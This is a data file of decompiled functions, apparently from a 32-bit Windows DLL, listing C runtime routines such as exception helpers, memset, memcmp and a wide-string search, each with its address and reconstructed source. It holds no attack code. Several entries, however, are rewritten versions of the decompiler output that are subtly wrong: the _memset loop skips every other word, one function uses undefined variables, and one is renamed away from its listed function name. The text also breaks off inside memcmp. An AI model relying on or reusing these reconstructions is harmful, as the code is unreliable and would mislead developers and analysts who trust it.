{"Function Name": "_CallMemberFunction0", "Address": "10017e60", "Source Code": "void _CallMemberFunction0(void *first_param, void *function_ptr)\n{\n    \n    (*(code *)function_ptr)();\n}"}
{"Function Name": "__IsExceptionObjectToBeDestroyed", "Address": "10017e6d", "Source Code": "undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int exception_id)\n{\n    \n    int *current_exception = *(int **)(get_thread_local_data() + 0x24);\n    \n    \n    while (current_exception != (int *)0x0) {\n        \n        if (*current_exception == exception_id) \n            return 0; \n        \n        \n        current_exception = (int *)current_exception[1];\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "___AdjustPointer", "Address": "10017e93", "Source Code": "int __cdecl ___AdjustPointer(int input_value, int *array_pointer)\n{\n    \n    int second_element = array_pointer[1];\n    \n    \n    int adjusted_value = *array_pointer + input_value;\n    \n    if (second_element >= 0) {\n        \n        adjusted_value += *(int *)(*(int *)(second_element + input_value) + array_pointer[2]) + second_element;\n    }\n    \n    \n    return adjusted_value;\n}"}
{"Function Name": "___std_exception_copy", "Address": "10017f02", "Source Code": "void __cdecl ___std_exception_copy(char **source_string, char **destination_string)\n{\n    char *current_char; \n    \n    if ((*(char *)(source_string + 1) == '\\0') || (current_char = *source_string, current_char == (char *)0x0)) {\n        *destination_string = *source_string; \n        *(undefined *)(destination_string + 1) = 0; \n    } else {\n        char *next_char = current_char + 1; \n        \n        while (*current_char != '\\0') {\n            current_char++; \n        }\n        \n        char *new_string = (char *)FUN_10025334((size_t)(current_char + (1 - (int)next_char)));\n        \n        if (new_string != (char *)0x0) {\n            \n            _strcpy_s(new_string, (rsize_t)(current_char + (1 - (int)next_char)), *source_string);\n            *destination_string = new_string; \n            *(undefined *)(destination_string + 1) = 1; \n        }\n        FUN_1001dc78((char *)0x0); \n    }\n    return; \n}"}
{"Function Name": "___std_exception_destroy", "Address": "10017f65", "Source Code": "void __cdecl ___std_exception_destroy(void **exception_pointer)\n{\n    \n    if (*(char *)(exception_pointer + 1) != '\\0') {\n        \n        destroy_exception(*exception_pointer);\n    }\n    \n    *exception_pointer = NULL;\n    \n    *(char *)(exception_pointer + 1) = 0;\n}"}
{"Function Name": "FUN_10017f84", "Address": "10017f84", "Source Code": "uint FUN_10017f84(void) \n{\n    \n    \n    \n    return (inputValue1 ^ inputValue2) >> (inputValue1 & 0x1f) | \n           (inputValue1 ^ inputValue2) << (0x20 - (inputValue1 & 0x1f));\n}"}
{"Function Name": "FUN_10017f99", "Address": "10017f99", "Source Code": "void FUN_10017f99(void)\n{\n    \n    code *functionPointer = (code *)getFunctionPointer();\n    \n    \n    if (functionPointer != (code *)0x0) {\n        \n        (*(code *)guardCheckFunction)();\n        \n        \n        (*functionPointer)();\n    }\n    \n    \n    abortProgram();\n}"}
{"Function Name": "FUN_10017fb5", "Address": "10017fb5", "Source Code": "undefined (*) [16] __cdecl FUN_10017fb5(undefined (*param_1) [16],undefined (*param_2) [16])\n{\nushort uVar1;\nuint uVar2;\nushort uVar3;\nint iVar4;\nundefined (*pauVar5) [16];\nundefined (*pauVar6) [16];\nundefined auVar7 [16];\nundefined auVar8 [16];\nundefined auVar9 [16];\nundefined auVar10 [16];\nundefined auVar11 [16];\nundefined auVar12 [16];\nshort sVar13;\nshort sVar14;\nint local_14;\nuVar1 = *(ushort *)*param_2;\nif (uVar1 != 0) {\nif (1 < DAT_1004f950) {\nif (((uint)param_2 & 0xfff) < 0xff1) {\nauVar7 = *param_2;\n}\nelse {\niVar4 = 8;\npauVar5 = param_2;\nauVar8 = (undefined  [16])0x0;\nuVar3 = uVar1;\ndo {\nauVar7._0_8_ = auVar8._2_8_;\nauVar7._8_8_ = auVar8._8_8_ >> 0x10 | (ulonglong)uVar3 << 0x30;\nif (uVar3 != 0) {\npauVar5 = (undefined (*) [16])(*pauVar5 + 2);\nuVar3 = *(ushort *)*pauVar5;\n}\niVar4 = iVar4 + -1;\nauVar8 = auVar7;\n} while (iVar4 != 0);\n}\nLAB_10018038:\nwhile( true ) {\nwhile( true ) {\nuVar2 = (uint)param_1 & 0xfff;\npauVar5 = param_2;\nif (uVar2 < 0xff1) break;\nif (*(ushort *)*param_1 == 0) goto LAB_10018226;\npauVar6 = param_1;\nif (*(ushort *)*param_1 == uVar1) goto LAB_1001806a;\nparam_1 = (undefined (*) [16])(*param_1 + 2);\n}\npcmpistri(auVar7,*param_1,0xd);\nif (uVar2 < 0xff1) break;\nparam_1 = param_1 + 1;\n}\nif (uVar2 < 0xff0) {\niVar4 = pcmpistri(auVar7,*param_1,0xd);\nparam_1 = (undefined (*) [16])(*param_1 + iVar4 * 2);\npauVar6 = param_1;\nLAB_1001806a:\ndo {\nfor (; 0xff0 < ((uint)param_1 & 0xfff); param_1 = (undefined (*) [16])(*param_1 + 2)) {\nLAB_100180b8:\nif (*(short *)*pauVar5 == 0) {\nreturn pauVar6;\n}\nif (*(short *)*param_1 != *(short *)*pauVar5) goto LAB_100180d0;\npauVar5 = (undefined (*) [16])(*pauVar5 + 2);\n}\nuVar2 = (uint)pauVar5 & 0xfff;\nif (0xff0 < uVar2) goto LAB_100180b8;\npcmpistri(*pauVar5,*param_1,0xd);\nif (!SBORROW4(uVar2,0xff0)) goto LAB_100180d0;\nif ((int)(uVar2 - 0xff0) < 0) {\nreturn pauVar6;\n}\nparam_1 = param_1 + 1;\npauVar5 = pauVar5 + 1;\n} while( true );\n}\ngoto LAB_10018226;\n}\nif (DAT_1004f950 == 1) {\nauVar8 = pshuflw(ZEXT216(uVar1),ZEXT216(uVar1),0);\nLAB_100180ff:\nfor (; ((uint)param_1 & 0xfff) < 0xff1; param_1 = param_1 + 1) {\nauVar9._0_2_ = -(ushort)(*(short *)*param_1 == 0);\nauVar9._2_2_ = -(ushort)(*(short *)(*param_1 + 2) == 0);\nauVar9._4_2_ = -(ushort)(*(short *)(*param_1 + 4) == 0);\nauVar9._6_2_ = -(ushort)(*(short *)(*param_1 + 6) == 0);\nauVar9._8_2_ = -(ushort)(*(short *)(*param_1 + 8) == 0);\nauVar9._10_2_ = -(ushort)(*(short *)(*param_1 + 10) == 0);\nauVar9._12_2_ = -(ushort)(*(short *)(*param_1 + 0xc) == 0);\nauVar9._14_2_ = -(ushort)(*(short *)(*param_1 + 0xe) == 0);\nsVar13 = auVar8._0_2_;\nauVar11._0_2_ = -(ushort)(*(short *)*param_1 == sVar13);\nsVar14 = auVar8._2_2_;\nauVar11._2_2_ = -(ushort)(*(short *)(*param_1 + 2) == sVar14);\nauVar11._4_2_ = -(ushort)(*(short *)(*param_1 + 4) == sVar13);\nauVar11._6_2_ = -(ushort)(*(short *)(*param_1 + 6) == sVar14);\nauVar11._8_2_ = -(ushort)(*(short *)(*param_1 + 8) == sVar13);\nauVar11._10_2_ = -(ushort)(*(short *)(*param_1 + 10) == sVar14);\nauVar11._12_2_ = -(ushort)(*(short *)(*param_1 + 0xc) == sVar13);\nauVar11._14_2_ = -(ushort)(*(short *)(*param_1 + 0xe) == sVar14);\nauVar9 = auVar9 | auVar11;\nuVar1 = (ushort)(SUB161(auVar9 >> 7,0) & 1) | (ushort)(SUB161(auVar9 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar9 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar9 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar9 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar9 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar9 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar9 >> 0x3f,0) & 1) << 7 |\n(ushort)(SUB161(auVar9 >> 0x47,0) & 1) << 8 |\n(ushort)(SUB161(auVar9 >> 0x4f,0) & 1) << 9 |\n(ushort)(SUB161(auVar9 >> 0x57,0) & 1) << 10 |\n(ushort)(SUB161(auVar9 >> 0x5f,0) & 1) << 0xb |\n(ushort)(SUB161(auVar9 >> 0x67,0) & 1) << 0xc |\n(ushort)(SUB161(auVar9 >> 0x6f,0) & 1) << 0xd |\n(ushort)(SUB161(auVar9 >> 0x77,0) & 1) << 0xe |\n(ushort)(byte)(auVar9[0xf] >> 7) << 0xf;\nif (uVar1 != 0) {\nuVar2 = 0;\nif (uVar1 != 0) {\nfor (; (uVar1 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {\n}\n}\nparam_1 = (undefined (*) [16])(*param_1 + (uVar2 & 0xfffffffe));\nbreak;\n}\n}\nif (*(short *)*param_1 != 0) {\npauVar5 = param_1;\npauVar6 = param_2;\nif (*(short *)*param_2 == *(short *)*param_1) {\nLAB_1001814c:\nfor (; (((uint)pauVar6 & 0xfff) < 0xff1 && (((uint)pauVar5 & 0xfff) < 0xff1));\npauVar5 = pauVar5 + 1) {\nauVar10._0_2_ = -(ushort)(*(short *)*pauVar6 == 0);\nauVar10._2_2_ = -(ushort)(*(short *)(*pauVar6 + 2) == 0);\nauVar10._4_2_ = -(ushort)(*(short *)(*pauVar6 + 4) == 0);\nauVar10._6_2_ = -(ushort)(*(short *)(*pauVar6 + 6) == 0);\nauVar10._8_2_ = -(ushort)(*(short *)(*pauVar6 + 8) == 0);\nauVar10._10_2_ = -(ushort)(*(short *)(*pauVar6 + 10) == 0);\nauVar10._12_2_ = -(ushort)(*(short *)(*pauVar6 + 0xc) == 0);\nauVar10._14_2_ = -(ushort)(*(short *)(*pauVar6 + 0xe) == 0);\nauVar12._0_2_ = -(ushort)(*(short *)*pauVar5 != *(short *)*pauVar6);\nauVar12._2_2_ = -(ushort)(*(short *)(*pauVar5 + 2) != *(short *)(*pauVar6 + 2));\nauVar12._4_2_ = -(ushort)(*(short *)(*pauVar5 + 4) != *(short *)(*pauVar6 + 4));\nauVar12._6_2_ = -(ushort)(*(short *)(*pauVar5 + 6) != *(short *)(*pauVar6 + 6));\nauVar12._8_2_ = -(ushort)(*(short *)(*pauVar5 + 8) != *(short *)(*pauVar6 + 8));\nauVar12._10_2_ = -(ushort)(*(short *)(*pauVar5 + 10) != *(short *)(*pauVar6 + 10));\nauVar12._12_2_ = -(ushort)(*(short *)(*pauVar5 + 0xc) != *(short *)(*pauVar6 + 0xc));\nauVar12._14_2_ = -(ushort)(*(short *)(*pauVar5 + 0xe) != *(short *)(*pauVar6 + 0xe));\nauVar12 = auVar12 | auVar10;\nuVar1 = (ushort)(SUB161(auVar12 >> 7,0) & 1) |\n(ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |\n(ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |\n(ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |\n(ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |\n(ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |\n(ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |\n(ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |\n(ushort)(SUB161(auVar12 >> 0x77,0) & 1) << 0xe |\n(ushort)(byte)(auVar12[0xf] >> 7) << 0xf;\nif (uVar1 != 0) {\nuVar2 = 0;\nif (uVar1 != 0) {\nfor (; (uVar1 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {\n}\n}\npauVar5 = (undefined (*) [16])(*pauVar5 + (uVar2 & 0xfffffffe));\npauVar6 = (undefined (*) [16])(*pauVar6 + (uVar2 & 0xfffffffe));\nbreak;\n}\npauVar6 = pauVar6 + 1;\n}\nif (*(short *)*pauVar6 == 0) {\nreturn param_1;\n}\nif (*(short *)*pauVar5 == *(short *)*pauVar6) {\npauVar5 = (undefined (*) [16])(*pauVar5 + 2);\npauVar6 = (undefined (*) [16])(*pauVar6 + 2);\ngoto LAB_1001814c;\n}\n}\nparam_1 = (undefined (*) [16])(*param_1 + 2);\ngoto LAB_100180ff;\n}\n}\nelse if (*(short *)*param_1 != 0) {\nlocal_14 = (int)param_1 - (int)param_2;\npauVar5 = param_2;\nif (*(short *)*param_1 == 0) goto LAB_1001820b;\ndo {\ndo {\nif (*(short *)*pauVar5 == 0) {\nreturn param_1;\n}\n} while ((*(short *)(*pauVar5 + local_14) == *(short *)*pauVar5) &&\n(pauVar5 = (undefined (*) [16])(*pauVar5 + 2), *(short *)(*pauVar5 + local_14) != 0)\n);\nLAB_1001820b:\nif (*(short *)*pauVar5 == 0) {\nreturn param_1;\n}\nparam_1 = (undefined (*) [16])(*param_1 + 2);\nlocal_14 = local_14 + 2;\npauVar5 = param_2;\n} while (*(short *)*param_1 != 0);\n}\nLAB_10018226:\nparam_1 = (undefined (*) [16])0x0;\n}\nreturn param_1;\nLAB_100180d0:\nparam_1 = (undefined (*) [16])(*pauVar6 + 2);\ngoto LAB_10018038;\n}\nLocal Variable: local_res0 : undefined4\nLocal Variable: local_4 : undefined4\nLocal Variable: local_c : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4"}
{"Function Name": "___vcrt_initialize", "Address": "10018231", "Source Code": "uint initializeCRT(void) \n{\n    undefined4 intermediateValue; \n    FUN_1001b0e9(); \n    ___vcrt_initialize_winapi_thunks(); \n    uint lockInitStatus = ___vcrt_initialize_locks(); \n    if ((char)lockInitStatus != '\\0') { \n        intermediateValue = ___vcrt_initialize_ptd(); \n        if ((char)intermediateValue != '\\0') { \n            return CONCAT31((int3)((uint)intermediateValue >> 8), 1); \n        }\n        lockInitStatus = ___vcrt_uninitialize_locks(); \n    }\n    \n    return lockInitStatus & 0xffffff00; \n}"}
{"Function Name": "_ValidateLocalCookies", "Address": "100182a0", "Source Code": "void __cdecl _ValidateLocalCookies(int *cookie_array, int offset)\n{\n    \n    if (*cookie_array != -2) {\n        \n        ___security_check_cookie_4(cookie_array[1] + offset ^ *(uint *)(*cookie_array + offset));\n    }\n    \n    ___security_check_cookie_4(cookie_array[3] + offset ^ *(uint *)(cookie_array[2] + offset));\n}"}
{"Function Name": "_memset", "Address": "100184b0", "Source Code": "void * __cdecl _memset(void *destination, int value, size_t size)\n{\n    \n    if (size == 0) {\n        return destination;\n    }\n    \n    \n    int replicatedValue = (value & 0xffU) * 0x1010101;\n    int *intPointer = (int *)destination; \n    \n    if (size > 0x20) {\n        \n        if (size > 0x7f) {\n            \n            if ((DAT_1004f954 >> 1 & 1) != 0) {\n                \n                for (; size != 0; size--) {\n                    *(char *)intPointer = (char)replicatedValue; \n                    intPointer = (int *)((char *)intPointer + 1); \n                }\n                return destination; \n            }\n            \n            if ((DAT_1004e00c >> 1 & 1) == 0) goto joined_r0x100185bb;\n            \n            *intPointer++ = replicatedValue;\n            *intPointer++ = replicatedValue;\n            *intPointer++ = replicatedValue;\n            *intPointer++ = replicatedValue;\n            size -= 16; \n            \n            while (size > 0x80) {\n                for (int index = 0; index < 8; index++) {\n                    *intPointer++ = replicatedValue; \n                }\n                size -= 0x80; \n            }\n        }\n        \n        if ((DAT_1004e00c >> 1 & 1) != 0) {\n            \n            if (size > 0x1f) {\n                do {\n                    \n                    for (int index = 0; index < 8; index++) {\n                        *intPointer++ = replicatedValue; \n                    }\n                    size -= 0x20; \n                } while (size > 0x1f); \n                if ((size & 0x1f) == 0) {\n                    return destination; \n                }\n            }\n            \n            intPointer = (int *)((char *)intPointer + (size - 0x20));\n            for (int index = 0; index < 8; index++) {\n                *intPointer++ = replicatedValue; \n            }\n            return destination; \n        }\n    }\njoined_r0x100185bb:\n    \n    for (; (size & 3) != 0; size--) {\n        *(char *)intPointer = (char)replicatedValue; \n        intPointer = (int *)((char *)intPointer + 1); \n    }\n    \n    if ((size & 4) != 0) {\n        *intPointer++ = replicatedValue; \n        size -= 4; \n    }\n    \n    for (; (size & 0xfffffff8) != 0; size -= 8) {\n        *intPointer++ = replicatedValue; \n        intPointer++; \n    }\n    return destination; \n}"}
{"Function Name": "___std_type_info_compare", "Address": "1001860a", "Source Code": "uint __cdecl ___std_type_info_compare(int first_param, int second_param)\n{\n    \n    byte *first_byte_ptr = (byte *)(first_param + 5);\n    \n    byte *second_byte_ptr = (byte *)(second_param + 5);\n    byte current_byte;\n    \n    if (first_param != second_param) {\n        do {\n            \n            current_byte = *first_byte_ptr;\n            \n            if (current_byte != *second_byte_ptr) {\n                \n                return -(uint)(current_byte < *second_byte_ptr) | 1;\n            }\n            \n            if (current_byte == 0) {\n                return 0;\n            }\n            \n            first_byte_ptr += 2;\n            second_byte_ptr += 2;\n        \n        } while (first_byte_ptr[1] == second_byte_ptr[1]);\n    }\n    \n    return 0;\n}"}
{"Function Name": "___std_type_info_destroy_list", "Address": "10018646", "Source Code": "void __cdecl ___std_type_info_destroy_list(PSLIST_HEADER list_header)\n{\n    \n    PSINGLE_LIST_ENTRY current_entry = InterlockedFlushSList(list_header);\n    \n    \n    while (current_entry != NULL) {\n        \n        PSINGLE_LIST_ENTRY next_entry = current_entry->Next;\n        \n        \n        FUN_1001dc78(current_entry);\n        \n        \n        current_entry = next_entry;\n    }\n}"}
{"Function Name": "___uncaught_exception", "Address": "10019164", "Source Code": "bool is_uncaught_exception(void)\n{\n    \n    uint thread_local_data = ___vcrt_getptd_noinit();\n    \n    \n    return thread_local_data != 0 && 0 < *(int *)(thread_local_data + 0x18);\n}"}
{"Function Name": "_memcmp", "Address": "1001922d", "Source Code": "int __cdecl _memcmp(void *_Buf1,void *_Buf2,size_t _Size)\n{\nuint uVar1;\nuint uVar2;\nint iVar3;\n\nif (_Size == 0) {\nreturn 0;\n}\nif (_Size == 1) {\n\nuVar2 = (uint)*_Buf1;\n\nuVar1 = (uint)*_Buf2;\nLAB_1001a0e0:\nif (uVar2 == uVar1) {\nreturn 0;\n}\nreturn (uint)(0 < (int)(uVar2 - uVar1)) * 2 + -1;\n}\nif (_Size == 2) {\n\n\niVar3 = (uint)*_Buf1 - (uint)*_Buf2;\nif (iVar3 == 0) {\nuVar2 = (uint)*(byte *)((int)_Buf1 + 1);\nuVar1 = (uint)*(byte *)((int)_Buf2 + 1);\ngoto LAB_1001a0e0;\n}\nLAB_1001a0cc:\nreturn (uint)(0 < iVar3) * 2 + -1;\n}\nif (_Size == 3) {\n\n\niVar3 = (uint)*_Buf1 - (uint)*_Buf2;\nif ((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 1) - (uint)*(byte *)((int)_Buf2 + 1), iVar3 == 0)) {\nuVar2 = (uint)*(byte *)((int)_Buf1 + 2);\nuVar1 = (uint)*(byte *)((int)_Buf2 + 2);\ngoto LAB_1001a0e0;\n}\ngoto LAB_1001a0cc;\n}\nif (_Size == 4) {\n\n\niVar3 = (uint)*_Buf1 - (uint)*_Buf2;\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 1) - (uint)*(byte *)((int)_Buf2 + 1), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 2) - (uint)*(byte *)((int)_Buf2 + 2), iVar3 == 0)) {\nuVar2 = (uint)*(byte *)((int)_Buf1 + 3);\nuVar1 = (uint)*(byte *)((int)_Buf2 + 3);\ngoto LAB_1001a0e0;\n}\ngoto LAB_1001a0cc;\n}\nif (0x1f < _Size) {\ndo {\n\n\nif (*_Buf1 == *_Buf2) {\niVar3 = 0;\n}\nelse {\n\niVar3 = (*_Buf1 & 0xff) - (uint)*_Buf2;\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 1) - (uint)*(byte *)((int)_Buf2 + 1), iVar3 == 0))\n&& (iVar3 = (uint)*(byte *)((int)_Buf1 + 2) - (uint)*(byte *)((int)_Buf2 + 2), iVar3 == 0\n)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 3) - (uint)*(byte *)((int)_Buf2 + 3);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 4) == *(uint *)((int)_Buf2 + 4)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 4) & 0xff) - (uint)*(byte *)((int)_Buf2 + 4);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 5) - (uint)*(byte *)((int)_Buf2 + 5), iVar3 == 0))\n&& (iVar3 = (uint)*(byte *)((int)_Buf1 + 6) - (uint)*(byte *)((int)_Buf2 + 6), iVar3 == 0\n)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 7) - (uint)*(byte *)((int)_Buf2 + 7);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 8) == *(uint *)((int)_Buf2 + 8)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 8) & 0xff) - (uint)*(byte *)((int)_Buf2 + 8);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 9) - (uint)*(byte *)((int)_Buf2 + 9), iVar3 == 0))\n&& (iVar3 = (uint)*(byte *)((int)_Buf1 + 10) - (uint)*(byte *)((int)_Buf2 + 10),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0xb) - (uint)*(byte *)((int)_Buf2 + 0xb);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 0xc) == *(uint *)((int)_Buf2 + 0xc)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 0xc) & 0xff) - (uint)*(byte *)((int)_Buf2 + 0xc);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0xd) - (uint)*(byte *)((int)_Buf2 + 0xd),\niVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0xe) - (uint)*(byte *)((int)_Buf2 + 0xe),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0xf) - (uint)*(byte *)((int)_Buf2 + 0xf);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 0x10) == *(uint *)((int)_Buf2 + 0x10)) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0x10) - (uint)*(byte *)((int)_Buf2 + 0x10);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x11) - (uint)*(byte *)((int)_Buf2 + 0x11),\niVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x12) - (uint)*(byte *)((int)_Buf2 + 0x12),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0x13) - (uint)*(byte *)((int)_Buf2 + 0x13);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 0x14) == *(uint *)((int)_Buf2 + 0x14)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 0x14) & 0xff) - (uint)*(byte *)((int)_Buf2 + 0x14);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x15) - (uint)*(byte *)((int)_Buf2 + 0x15),\niVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x16) - (uint)*(byte *)((int)_Buf2 + 0x16),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0x17) - (uint)*(byte *)((int)_Buf2 + 0x17);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 0x18) == *(uint *)((int)_Buf2 + 0x18)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 0x18) & 0xff) - (uint)*(byte *)((int)_Buf2 + 0x18);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x19) - (uint)*(byte *)((int)_Buf2 + 0x19),\niVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1a) - (uint)*(byte *)((int)_Buf2 + 0x1a),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0x1b) - (uint)*(byte *)((int)_Buf2 + 0x1b);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nif (*(uint *)((int)_Buf1 + 0x1c) == *(uint *)((int)_Buf2 + 0x1c)) {\niVar3 = 0;\n}\nelse {\niVar3 = (*(uint *)((int)_Buf1 + 0x1c) & 0xff) - (uint)*(byte *)((int)_Buf2 + 0x1c);\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1d) - (uint)*(byte *)((int)_Buf2 + 0x1d),\niVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1e) - (uint)*(byte *)((int)_Buf2 + 0x1e),\niVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + 0x1f) - (uint)*(byte *)((int)_Buf2 + 0x1f);\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\n_Size = _Size - 0x20;\n_Buf1 = (void *)((int)_Buf1 + 0x20);\n_Buf2 = (void *)((int)_Buf2 + 0x20);\n} while (0x1f < _Size);\n}\nswitch(_Size) {\ndefault:\ngoto switchD_10019598_caseD_0;\ncase 1:\ngoto switchD_10019598_caseD_1;\ncase 2:\ngoto switchD_10019598_caseD_2;\ncase 3:\ngoto switchD_10019598_caseD_3;\ncase 4:\ngoto switchD_10019598_caseD_4;\ncase 5:\ngoto switchD_10019598_caseD_5;\ncase 6:\ngoto switchD_10019598_caseD_6;\ncase 7:\ngoto switchD_10019598_caseD_7;\ncase 8:\ngoto switchD_10019598_caseD_8;\ncase 9:\ngoto switchD_10019598_caseD_9;\ncase 10:\ngoto switchD_10019598_caseD_a;\ncase 0xb:\ngoto switchD_10019598_caseD_b;\ncase 0xc:\ngoto switchD_10019598_caseD_c;\ncase 0xd:\ngoto switchD_10019598_caseD_d;\ncase 0xe:\ngoto switchD_10019598_caseD_e;\ncase 0xf:\ngoto switchD_10019598_caseD_f;\ncase 0x10:\ngoto switchD_10019598_caseD_10;\ncase 0x11:\ngoto switchD_10019598_caseD_11;\ncase 0x12:\ngoto switchD_10019598_caseD_12;\ncase 0x13:\ngoto switchD_10019598_caseD_13;\ncase 0x14:\ngoto switchD_10019598_caseD_14;\ncase 0x15:\ngoto switchD_10019598_caseD_15;\ncase 0x16:\ngoto switchD_10019598_caseD_16;\ncase 0x17:\ngoto switchD_10019598_caseD_17;\ncase 0x1a:\ngoto switchD_10019598_caseD_1a;\ncase 0x1b:\ngoto switchD_10019598_caseD_1b;\ncase 0x1c:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1c));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1c))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1b)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1a)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x19));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\ncase 0x18:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x18));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x18))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) 